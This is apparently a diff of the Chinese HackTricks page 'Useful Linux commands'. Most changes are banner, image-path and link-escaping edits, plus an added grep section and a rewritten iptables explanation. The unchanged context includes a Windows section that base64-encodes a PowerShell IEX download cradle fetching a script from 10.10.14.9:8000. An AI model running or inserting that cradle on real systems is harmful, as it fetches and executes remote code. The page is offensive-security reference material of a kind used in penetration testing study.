@@ -1,6 +1,6 @@
 # 有用的Linux命令
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)来轻松构建和**自动化工作流程**，使用世界上**最先进**的社区工具。\
@@ -17,7 +17,7 @@
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我们。
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
@@ -141,7 +141,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
@@ -149,7 +149,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## 适用于Windows的Bash
+## Windows下的Bash
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -171,7 +171,35 @@ i686-mingw32msvc-gcc -o executable useradd.c
 ```
 ## Greps
 
-## Greps
+### Grep for a string in all files in a directory
+
+```bash
+grep -r "search_term" /path/to/directory
+```
+
+### Grep for a string in all files in the current directory
+
+```bash
+grep -r "search_term" .
+```
+
+### Grep for a string in all files in the current directory (case insensitive)
+
+```bash
+grep -ri "search_term" .
+```
+
+### Grep for a string in all files in a directory and show line numbers
+
+```bash
+grep -rn "search_term" /path/to/directory
+```
+
+### Grep for a string in all files in a directory and show line numbers (case insensitive)
+
+```bash
+grep -rni "search_term" /path/to/directory
+```
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -296,33 +324,24 @@ for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do ech
 ```
 ## Iptables
 
-### iptables是什么？
-
-iptables是一个用于配置Linux内核防火墙的命令行工具。它允许系统管理员控制网络流量通过定义规则集。iptables规则集包括允许、拒绝或转发数据包的规则。
-
-### 常用iptables命令
-
-- `iptables -L`：列出当前的iptables规则。
-- `iptables -F`：清除所有的iptables规则。
-- `iptables -A`：添加一条新的iptables规则。
-- `iptables -D`：删除一条iptables规则。
-- `iptables -P`：设置默认策略（默认允许或拒绝）。
-
-### iptables规则结构
-
-iptables规则通常由以下部分组成：
-
-1. 表（Table）：规则所属的表，如filter、nat、mangle等。
-2. 链（Chain）：规则所属的链，如INPUT、OUTPUT、FORWARD等。
-3. 匹配条件（Match）：规则匹配的条件，如源IP、目标端口等。
-4. 动作（Target）：匹配成功后执行的动作，如ACCEPT、DROP等。
-
-### iptables实例
-
-以下是一个iptables规则的示例，允许所有对外发起的HTTP请求：
+### iptables是一个用于配置IPv4和IPv6数据包过滤规则的工具。它可以用于设置、维护和检查防火墙规则，以保护Linux系统免受网络攻击。iptables命令的基本语法如下：
 
 ```bash
-iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
+iptables -option chain rule
+```
+
+### 一些常用的iptables命令选项包括：
+
+- `-A`：向规则链中添加规则
+- `-D`：从规则链中删除规则
+- `-L`：列出规则链中的规则
+- `-P`：设置规则链的默认策略
+- `-F`：清除规则链中的所有规则
+
+### 例如，要列出所有防火墙规则，可以使用以下命令：
+
+```bash
+iptables -L
 ```
 ```bash
 #Delete curent rules and chains
@@ -362,16 +381,16 @@ iptables -P OUTPUT ACCEPT
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
+使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
